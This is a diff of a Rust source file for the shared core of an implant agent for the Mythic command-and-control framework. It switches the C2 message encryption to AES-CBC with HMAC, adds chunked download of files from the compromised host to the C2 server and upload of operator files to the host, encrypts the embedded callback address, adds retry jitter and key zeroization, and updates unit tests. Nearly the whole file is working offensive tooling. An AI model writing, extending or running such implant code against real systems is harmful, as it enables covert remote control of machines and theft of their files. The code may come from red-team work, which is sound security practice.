@@ -1,8 +1,9 @@
 // link-common — Mythic protocol implementation
 //
-// Wire format: UUID(36) + base64(nonce_12 || AES-256-GCM(JSON))
-// Key: derive_key(IMPLANT_SECRET, "mythic-salt")
-// CALLBACK address is stored as hex(nonce_12 || AES-256-GCM(address)) — see encrypt_config/decrypt_config.
+// Wire format (Mythic standard): base64( UUID(36) + IV(16) + AES-256-CBC(PKCS7(JSON)) + HMAC-SHA256(32) )
+// Key: raw 32-byte AES key from AESPSK C2 profile parameter (base64-decoded at runtime).
+// HMAC uses the same AES key over (IV + ciphertext).
+// CALLBACK address is stored as hex(IV_16 || AES-256-CBC(address) || HMAC_32) — see encrypt_config/decrypt_config.
 
 use std::sync::atomic::{AtomicI64, AtomicU32, AtomicU64, Ordering};
 
@@ -55,10 +56,69 @@ pub struct GetTaskingResponse {
 #[derive(serde::Serialize)]
 pub struct TaskResponse {
     pub task_id: String,
+    #[serde(skip_serializing_if = "std::ops::Not::not")]
     pub completed: bool,
-    pub user_output: String,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub user_output: Option<String>,
     #[serde(skip_serializing_if = "Option::is_none")]
     pub status: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub download: Option<DownloadRegistration>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub upload: Option<UploadRequest>,
+}
+
+#[derive(serde::Serialize)]
+pub struct DownloadRegistration {
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub total_chunks: Option<i64>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub full_path: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub chunk_size: Option<usize>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub is_screenshot: Option<bool>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub chunk_num: Option<i64>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub file_id: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub chunk_data: Option<String>,
+}
+
+#[derive(serde::Serialize)]
+pub struct UploadRequest {
+    pub chunk_size: usize,
+    pub file_id: String,
+    pub chunk_num: i64,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub full_path: Option<String>,
+}
+
+#[derive(serde::Deserialize, Default)]
+pub struct PostResponseEntry {
+    #[serde(default)]
+    pub status: String,
+    #[serde(default)]
+    pub file_id: String,
+    #[serde(default)]
+    pub task_id: String,
+    #[serde(default)]
+    pub error: String,
+    #[serde(default)]
+    pub total_chunks: i64,
+    #[serde(default)]
+    pub chunk_num: i64,
+    #[serde(default)]
+    pub chunk_data: String,
+}
+
+#[derive(serde::Deserialize, Default)]
+pub struct PostResponse {
+    #[serde(default)]
+    pub action: String,
+    #[serde(default)]
+    pub responses: Vec<PostResponseEntry>,
 }
 
 #[derive(serde::Serialize)]
@@ -78,108 +138,139 @@ pub fn build_client() -> reqwest::blocking::Client {
         .expect("reqwest client init failed")
 }
 
-// ── Encryption ─────────────────────────────────────────────────────────────────
+// ── AES-256-CBC + HMAC-SHA256 (Mythic standard) ───────────────────────────────
 
-/// Derive a 32-byte AES key: SHA-256(secret || salt).
-pub fn derive_key(secret: &[u8], salt: &str) -> [u8; 32] {
-    use sha2::{Digest, Sha256};
-    let mut h = Sha256::new();
-    h.update(secret);
-    h.update(salt.as_bytes());
-    h.finalize().into()
+fn aes_cbc_encrypt(plaintext: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
+    use aes::Aes256;
+    use cbc::cipher::{BlockEncryptMut, KeyIvInit};
+    use cbc::cipher::block_padding::Pkcs7;
+    type Aes256CbcEnc = cbc::Encryptor<Aes256>;
+
+    let enc = Aes256CbcEnc::new(key.into(), iv.into());
+    let padded_len = plaintext.len() + (16 - plaintext.len() % 16);
+    let mut buf = vec![0u8; padded_len];
+    buf[..plaintext.len()].copy_from_slice(plaintext);
+    let ct = enc.encrypt_padded_mut::<Pkcs7>(&mut buf, plaintext.len()).expect("encrypt");
+    ct.to_vec()
 }
 
-/// Build a Mythic wire message: UUID(36) + base64(nonce_12 || AES-256-GCM(json)).
-/// Returns an empty string on encryption failure instead of panicking.
+fn aes_cbc_decrypt(ciphertext: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Option<Vec<u8>> {
+    use aes::Aes256;
+    use cbc::cipher::{BlockDecryptMut, KeyIvInit};
+    use cbc::cipher::block_padding::Pkcs7;
+    type Aes256CbcDec = cbc::Decryptor<Aes256>;
+
+    let dec = Aes256CbcDec::new(key.into(), iv.into());
+    let mut buf = ciphertext.to_vec();
+    let pt = dec.decrypt_padded_mut::<Pkcs7>(&mut buf).ok()?;
+    Some(pt.to_vec())
+}
+
+fn hmac_sha256(key: &[u8], data: &[u8]) -> [u8; 32] {
+    use hmac::{Hmac, Mac};
+    use sha2::Sha256;
+    let mut mac = Hmac::<Sha256>::new_from_slice(key).expect("HMAC key length");
+    mac.update(data);
+    mac.finalize().into_bytes().into()
+}
+
+/// Decode a base64-encoded 32-byte AES key (from Mythic AESPSK).
+pub fn decode_aes_key(b64_key: &str) -> Option<[u8; 32]> {
+    use base64::{engine::general_purpose::STANDARD, Engine as _};
+    let bytes = STANDARD.decode(b64_key).ok()?;
+    if bytes.len() != 32 {
+        return None;
+    }
+    let mut key = [0u8; 32];
+    key.copy_from_slice(&bytes);
+    Some(key)
+}
+
+/// Build a Mythic wire message: base64( UUID(36) + IV(16) + AES-256-CBC(JSON) + HMAC-SHA256(32) ).
+/// Returns an empty string on encryption failure.
 pub fn build_mythic_message(uuid: &str, payload_json: &str, key: &[u8; 32]) -> String {
-    use aes_gcm::{
-        aead::{Aead, KeyInit},
-        Aes256Gcm, Nonce,
-    };
     use base64::{engine::general_purpose::STANDARD, Engine as _};
 
-    let nonce_bytes = rand::random::<[u8; 12]>();
-    let nonce = Nonce::from_slice(&nonce_bytes);
-    let cipher = match Aes256Gcm::new_from_slice(key) {
-        Ok(c) => c,
-        Err(_) => return String::new(),
-    };
-    let ct = match cipher.encrypt(nonce, payload_json.as_bytes()) {
-        Ok(c) => c,
-        Err(_) => return String::new(),
-    };
+    let iv: [u8; 16] = rand::random();
+    let ciphertext = aes_cbc_encrypt(payload_json.as_bytes(), key, &iv);
 
-    let mut blob = Vec::with_capacity(12 + ct.len());
-    blob.extend_from_slice(&nonce_bytes);
-    blob.extend_from_slice(&ct);
+    let mut iv_ct = Vec::with_capacity(16 + ciphertext.len());
+    iv_ct.extend_from_slice(&iv);
+    iv_ct.extend_from_slice(&ciphertext);
+    let hmac = hmac_sha256(key, &iv_ct);
 
-    format!("{}{}", uuid, STANDARD.encode(&blob))
+    let mut msg = Vec::with_capacity(36 + iv_ct.len() + 32);
+    msg.extend_from_slice(uuid.as_bytes());
+    msg.extend_from_slice(&iv_ct);
+    msg.extend_from_slice(&hmac);
+
+    STANDARD.encode(&msg)
 }
 
-/// Parse a Mythic wire message: strip UUID, base64-decode, AES-GCM-decrypt.
+/// Parse a Mythic wire message: base64-decode, strip UUID, verify HMAC, AES-CBC-decrypt.
 pub fn parse_mythic_message(raw: &str, key: &[u8; 32]) -> Option<String> {
-    use aes_gcm::{
-        aead::{Aead, KeyInit},
-        Aes256Gcm, Nonce,
-    };
     use base64::{engine::general_purpose::STANDARD, Engine as _};
 
-    if raw.len() < 36 {
-        return None;
-    }
-    let blob = STANDARD.decode(&raw[36..]).ok()?;
-    if blob.len() < 12 {
+    let blob = STANDARD.decode(raw).ok()?;
+    // UUID(36) + IV(16) + at least 16 bytes ciphertext + HMAC(32)
+    if blob.len() < 36 + 16 + 16 + 32 {
         return None;
     }
 
-    let nonce = Nonce::from_slice(&blob[..12]);
-    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
-    cipher
-        .decrypt(nonce, &blob[12..])
-        .ok()
-        .and_then(|b| String::from_utf8(b).ok())
+    let body = &blob[36..];
+    let hmac_offset = body.len() - 32;
+    let iv_ct = &body[..hmac_offset];
+    let received_hmac = &body[hmac_offset..];
+
+    let computed_hmac = hmac_sha256(key, iv_ct);
+    if computed_hmac != received_hmac {
+        return None;
+    }
+
+    let iv: [u8; 16] = iv_ct[..16].try_into().ok()?;
+    let ciphertext = &iv_ct[16..];
+    let plaintext = aes_cbc_decrypt(ciphertext, key, &iv)?;
+    String::from_utf8(plaintext).ok()
 }
 
-/// Encrypt a config value (CALLBACK address) → hex(nonce_12 || ciphertext).
-/// Used at build time by builder.go; the matching decrypt_config() is called at runtime.
+/// Encrypt a config value (CALLBACK address) → hex(IV_16 || ciphertext || HMAC_32).
 #[allow(dead_code)]
 pub fn encrypt_config(data: &str, key: &[u8; 32]) -> String {
-    use aes_gcm::{
-        aead::{Aead, KeyInit},
-        Aes256Gcm, Nonce,
-    };
-    let nonce_bytes = rand::random::<[u8; 12]>();
-    let nonce = Nonce::from_slice(&nonce_bytes);
-    let cipher = match Aes256Gcm::new_from_slice(key) {
-        Ok(c) => c,
-        Err(_) => return data.to_string(),
-    };
-    let ct = match cipher.encrypt(nonce, data.as_bytes()) {
-        Ok(c) => c,
-        Err(_) => return data.to_string(),
-    };
-    let mut result = Vec::with_capacity(12 + ct.len());
-    result.extend_from_slice(&nonce_bytes);
-    result.extend_from_slice(&ct);
+    let iv: [u8; 16] = rand::random();
+    let ciphertext = aes_cbc_encrypt(data.as_bytes(), key, &iv);
+
+    let mut iv_ct = Vec::with_capacity(16 + ciphertext.len());
+    iv_ct.extend_from_slice(&iv);
+    iv_ct.extend_from_slice(&ciphertext);
+    let hmac = hmac_sha256(key, &iv_ct);
+
+    let mut result = Vec::with_capacity(iv_ct.len() + 32);
+    result.extend_from_slice(&iv_ct);
+    result.extend_from_slice(&hmac);
     hex::encode(result)
 }
 
-/// Decrypt a hex(nonce_12 || ciphertext) config blob — used for the embedded CALLBACK address.
+/// Decrypt a hex(IV_16 || ciphertext || HMAC_32) config blob.
 pub fn decrypt_config(enc_hex: &str, key: &[u8; 32]) -> Option<String> {
-    use aes_gcm::{
-        aead::{Aead, KeyInit},
-        Aes256Gcm, Nonce,
-    };
     let data = hex::decode(enc_hex).ok()?;
-    if data.len() < 12 {
+    // IV(16) + at least 16 bytes ciphertext + HMAC(32)
+    if data.len() < 16 + 16 + 32 {
         return None;
     }
-    let nonce = Nonce::from_slice(&data[..12]);
-    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
-    cipher
-        .decrypt(nonce, &data[12..])
-        .ok()
-        .and_then(|b| String::from_utf8(b).ok())
+
+    let hmac_offset = data.len() - 32;
+    let iv_ct = &data[..hmac_offset];
+    let received_hmac = &data[hmac_offset..];
+
+    let computed_hmac = hmac_sha256(key, iv_ct);
+    if computed_hmac != received_hmac {
+        return None;
+    }
+
+    let iv: [u8; 16] = iv_ct[..16].try_into().ok()?;
+    let ciphertext = &iv_ct[16..];
+    let plaintext = aes_cbc_decrypt(ciphertext, key, &iv)?;
+    String::from_utf8(plaintext).ok()
 }
 
 // ── Shared state (sleep / jitter / kill date) ──────────────────────────────────
@@ -287,31 +378,218 @@ pub fn list_dir(path: &str) -> String {
     }
 }
 
-pub fn download_file(path: &str) -> String {
+const CHUNK_SIZE: usize = 512_000;
+
+/// Send a post_response message to Mythic and parse the response entries.
+fn send_post_response(
+    client: &reqwest::blocking::Client,
+    base_url: &str,
+    uri: &str,
+    callback_id: &str,
+    key: &[u8; 32],
+    responses: Vec<TaskResponse>,
+) -> Vec<PostResponseEntry> {
+    let msg = PostResponseMessage {
+        action: "post_response",
+        responses,
+    };
+    let json = serde_json::to_string(&msg).unwrap_or_default();
+    let wire = build_mythic_message(callback_id, &json, key);
+
+    client
+        .post(format!("{}{}", base_url, uri))
+        .body(wire)
+        .header("Content-Type", "application/octet-stream")
+        .send()
+        .ok()
+        .and_then(|r| r.text().ok())
+        .and_then(|raw| parse_mythic_message(&raw, key))
+        .and_then(|j| serde_json::from_str::<PostResponse>(&j).ok())
+        .map(|r| r.responses)
+        .unwrap_or_default()
+}
+
+/// Download a file from the agent to Mythic using chunked transfer protocol.
+pub fn mythic_download(
+    client: &reqwest::blocking::Client,
+    base_url: &str,
+    uri: &str,
+    callback_id: &str,
+    key: &[u8; 32],
+    task_id: &str,
+    path: &str,
+) -> String {
+    if path.is_empty() {
+        return "[-] Usage: download <path>".into();
+    }
+    let data = match std::fs::read(path) {
+        Ok(d) => d,
+        Err(e) => return format!("[-] {}", e),
+    };
+
+    let full_path = std::fs::canonicalize(path)
+        .map(|p| p.display().to_string())
+        .unwrap_or_else(|_| path.to_string());
+
+    let total_chunks = ((data.len() as f64) / CHUNK_SIZE as f64).ceil() as i64;
+    let total_chunks = total_chunks.max(1);
+
+    // Step 1: Register the download with Mythic
+    let reg = TaskResponse {
+        task_id: task_id.to_string(),
+        completed: false,
+        user_output: None,
+        status: None,
+        download: Some(DownloadRegistration {
+            total_chunks: Some(total_chunks),
+            full_path: Some(full_path.clone()),
+            chunk_size: Some(CHUNK_SIZE),
+            is_screenshot: Some(false),
+            chunk_num: None,
+            file_id: None,
+            chunk_data: None,
+        }),
+        upload: None,
+    };
+    let resp = send_post_response(client, base_url, uri, callback_id, key, vec![reg]);
+    let file_id = match resp.first() {
+        Some(e) if e.status == "success" && !e.file_id.is_empty() => e.file_id.clone(),
+        _ => return "[-] Failed to register download with Mythic".into(),
+    };
+
+    // Step 2: Send chunks
     use base64::{engine::general_purpose::STANDARD, Engine as _};
+    for chunk_num in 1..=total_chunks {
+        let start = ((chunk_num - 1) as usize) * CHUNK_SIZE;
+        let end = (start + CHUNK_SIZE).min(data.len());
+        let chunk_data = STANDARD.encode(&data[start..end]);
+
+        let chunk_resp = TaskResponse {
+            task_id: task_id.to_string(),
+            completed: chunk_num == total_chunks,
+            user_output: if chunk_num == total_chunks {
+                Some(format!("[+] Downloaded {} ({} bytes)", full_path, data.len()))
+            } else {
+                None
+            },
+            status: None,
+            download: Some(DownloadRegistration {
+                total_chunks: None,
+                full_path: None,
+                chunk_size: None,
+                is_screenshot: None,
+                chunk_num: Some(chunk_num),
+                file_id: Some(file_id.clone()),
+                chunk_data: Some(chunk_data),
+            }),
+            upload: None,
+        };
+        let resp = send_post_response(client, base_url, uri, callback_id, key, vec![chunk_resp]);
+        if resp.first().map(|e| e.status.as_str()) != Some("success") {
+            return format!("[-] Chunk {} upload failed", chunk_num);
+        }
+    }
+    format!("[+] Downloaded {} ({} bytes)", full_path, data.len())
+}
+
+/// Upload a file from Mythic to the agent using chunked transfer protocol.
+pub fn mythic_upload(
+    client: &reqwest::blocking::Client,
+    base_url: &str,
+    uri: &str,
+    callback_id: &str,
+    key: &[u8; 32],
+    task_id: &str,
+    file_id: &str,
+    dest_path: &str,
+) -> String {
+    use base64::{engine::general_purpose::STANDARD, Engine as _};
+
+    if file_id.is_empty() || dest_path.is_empty() {
+        return "[-] upload requires file and remote_path parameters".into();
+    }
+
+    let full_path = if dest_path.starts_with('/') || dest_path.starts_with('\\') {
+        dest_path.to_string()
+    } else {
+        std::env::current_dir()
+            .map(|d| d.join(dest_path).display().to_string())
+            .unwrap_or_else(|_| dest_path.to_string())
+    };
+
+    // Request first chunk to get total_chunks
+    let req = TaskResponse {
+        task_id: task_id.to_string(),
+        completed: false,
+        user_output: None,
+        status: None,
+        download: None,
+        upload: Some(UploadRequest {
+            chunk_size: CHUNK_SIZE,
+            file_id: file_id.to_string(),
+            chunk_num: 1,
+            full_path: Some(full_path.clone()),
+        }),
+    };
+    let resp = send_post_response(client, base_url, uri, callback_id, key, vec![req]);
+    let first = match resp.first() {
+        Some(e) if e.status == "success" => e,
+        Some(e) => return format!("[-] Upload failed: {}", e.error),
+        None => return "[-] No response from Mythic for upload".into(),
+    };
+
+    let total_chunks = first.total_chunks;
+    let mut file_data = match STANDARD.decode(&first.chunk_data) {
+        Ok(d) => d,
+        Err(e) => return format!("[-] Chunk 1 decode error: {}", e),
+    };
+
+    // Request remaining chunks
+    for chunk_num in 2..=total_chunks {
+        let req = TaskResponse {
+            task_id: task_id.to_string(),
+            completed: false,
+            user_output: None,
+            status: None,
+            download: None,
+            upload: Some(UploadRequest {
+                chunk_size: CHUNK_SIZE,
+                file_id: file_id.to_string(),
+                chunk_num,
+                full_path: None,
+            }),
+        };
+        let resp = send_post_response(client, base_url, uri, callback_id, key, vec![req]);
+        match resp.first() {
+            Some(e) if e.status == "success" => {
+                match STANDARD.decode(&e.chunk_data) {
+                    Ok(d) => file_data.extend_from_slice(&d),
+                    Err(e) => return format!("[-] Chunk {} decode error: {}", chunk_num, e),
+                }
+            }
+            _ => return format!("[-] Chunk {} fetch failed", chunk_num),
+        }
+    }
+
+    match std::fs::write(&full_path, &file_data) {
+        Ok(()) => format!("[+] Uploaded {} ({} bytes)", full_path, file_data.len()),
+        Err(e) => format!("[-] Write error: {}", e),
+    }
+}
+
+// Keep simple versions for non-networked tests / fallback
+pub fn download_file(path: &str) -> String {
     if path.is_empty() {
         return "[-] Usage: download <path>".into();
     }
     match std::fs::read(path) {
-        Ok(buf) => format!("FILE:{}:{}", path, STANDARD.encode(&buf)),
+        Ok(buf) => format!("[+] File read: {} ({} bytes)", path, buf.len()),
         Err(e) => format!("[-] {}", e),
     }
 }
 
-pub fn upload_file(args: &str) -> String {
-    use base64::{engine::general_purpose::STANDARD, Engine as _};
-    let (content, path) = match args.find(' ') {
-        Some(i) => (&args[..i], args[i + 1..].trim_start()),
-        None => return "[-] Invalid upload format".into(),
-    };
-    let decoded = match STANDARD.decode(content) {
-        Ok(d) => d,
-        Err(e) => return format!("[-] base64 decode: {}", e),
-    };
-    match std::fs::write(path, &decoded) {
-        Ok(()) => format!("[+] Uploaded to {}", path),
-        Err(e) => format!("[-] {}", e),
-    }
+pub fn upload_file(_args: &str) -> String {
+    "[-] Upload requires Mythic file transfer protocol".into()
 }
 
 pub fn handle_sleep_command(args: &str) -> String {
@@ -379,7 +657,12 @@ pub fn run_c2_loop<F>(
 ) where
     F: Fn(&str, &str) -> String,
 {
-    let encryption_key = derive_key(implant_secret.as_bytes(), "mythic-salt");
+    use zeroize::Zeroize;
+
+    let mut encryption_key = match decode_aes_key(implant_secret) {
+        Some(k) => k,
+        None => return,
+    };
     let decrypted_callback =
         decrypt_config(callback, &encryption_key).unwrap_or_else(|| callback.to_string());
 
@@ -435,7 +718,7 @@ pub fn run_c2_loop<F>(
                 }
             }
         }
-        sleep(retry_delay);
+        sleep_with_jitter(retry_delay, 30);
         retry_delay = (retry_delay * 2).min(60);
     }
 
@@ -477,15 +760,57 @@ pub fn run_c2_loop<F>(
         let mut responses = Vec::new();
         for task in &tasks {
             if task.command == "exit" {
+                encryption_key.zeroize();
                 return;
             }
+
+            // Download and upload use Mythic's chunked file transfer protocol
+            // and require multiple round-trips — handle them outside of dispatch.
+            if task.command == "download" {
+                let path = extract_param(&task.parameters, "path");
+                let output = mythic_download(
+                    &client, &base, uri, &callback_id, &encryption_key,
+                    &task.id, &path,
+                );
+                let is_error = output.starts_with("[-]");
+                responses.push(TaskResponse {
+                    task_id: task.id.clone(),
+                    completed: true,
+                    user_output: Some(output),
+                    status: if is_error { Some("error".to_string()) } else { None },
+                    download: None,
+                    upload: None,
+                });
+                continue;
+            }
+            if task.command == "upload" {
+                let file_id = extract_param(&task.parameters, "file");
+                let dest = extract_param(&task.parameters, "remote_path");
+                let output = mythic_upload(
+                    &client, &base, uri, &callback_id, &encryption_key,
+                    &task.id, &file_id, &dest,
+                );
+                let is_error = output.starts_with("[-]");
+                responses.push(TaskResponse {
+                    task_id: task.id.clone(),
+                    completed: true,
+                    user_output: Some(output),
+                    status: if is_error { Some("error".to_string()) } else { None },
+                    download: None,
+                    upload: None,
+                });
+                continue;
+            }
+
             let output = dispatch(&task.command, &task.parameters);
             let is_error = output.starts_with("[-]");
             responses.push(TaskResponse {
                 task_id: task.id.clone(),
                 completed: true,
-                user_output: output,
+                user_output: Some(output),
                 status: if is_error { Some("error".to_string()) } else { None },
+                download: None,
+                upload: None,
             });
         }
 
@@ -504,6 +829,8 @@ pub fn run_c2_loop<F>(
 
         sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
     }
+
+    encryption_key.zeroize();
 }
 
 // ── Tests ──────────────────────────────────────────────────────────────────────
@@ -512,15 +839,24 @@ pub fn run_c2_loop<F>(
 mod tests {
     use super::*;
 
+    fn test_key() -> [u8; 32] {
+        use sha2::{Digest, Sha256};
+        let mut h = Sha256::new();
+        h.update(b"test-secret");
+        let hash = h.finalize();
+        let mut key = [0u8; 32];
+        key.copy_from_slice(&hash);
+        key
+    }
+
     #[test]
     fn test_mythic_wire_roundtrip() {
-        let key = derive_key(b"test-secret", "mythic-salt");
+        let key = test_key();
         let uuid = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
         let payload = r#"{"action":"get_tasking","tasking_size":-1}"#;
 
         let wire = build_mythic_message(uuid, payload, &key);
-        assert!(wire.starts_with(uuid));
-        assert!(wire.len() > 36);
+        assert!(!wire.is_empty());
 
         let recovered = parse_mythic_message(&wire, &key).unwrap();
         assert_eq!(recovered, payload);
@@ -528,8 +864,9 @@ mod tests {
 
     #[test]
     fn test_mythic_wire_wrong_key_returns_none() {
-        let key = derive_key(b"correct-key", "mythic-salt");
-        let wrong_key = derive_key(b"wrong-key", "mythic-salt");
+        let key = test_key();
+        let mut wrong_key = [0u8; 32];
+        wrong_key[0] = 0xFF;
         let uuid = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
 
         let wire = build_mythic_message(uuid, "hello", &key);
@@ -538,11 +875,27 @@ mod tests {
 
     #[test]
     fn test_config_roundtrip() {
-        let key = derive_key(b"test-secret", "mythic-salt");
+        let key = test_key();
         let addr = "192.168.1.10:443";
 
         let enc = encrypt_config(addr, &key);
         let dec = decrypt_config(&enc, &key).unwrap();
         assert_eq!(dec, addr);
+    }
+
+    #[test]
+    fn test_decode_aes_key() {
+        use base64::{engine::general_purpose::STANDARD, Engine as _};
+        let key = [42u8; 32];
+        let b64 = STANDARD.encode(key);
+        let decoded = decode_aes_key(&b64).unwrap();
+        assert_eq!(decoded, key);
+    }
+
+    #[test]
+    fn test_decode_aes_key_invalid_length() {
+        use base64::{engine::general_purpose::STANDARD, Engine as _};
+        let short = STANDARD.encode([0u8; 16]);
+        assert!(decode_aes_key(&short).is_none());
     }
 }
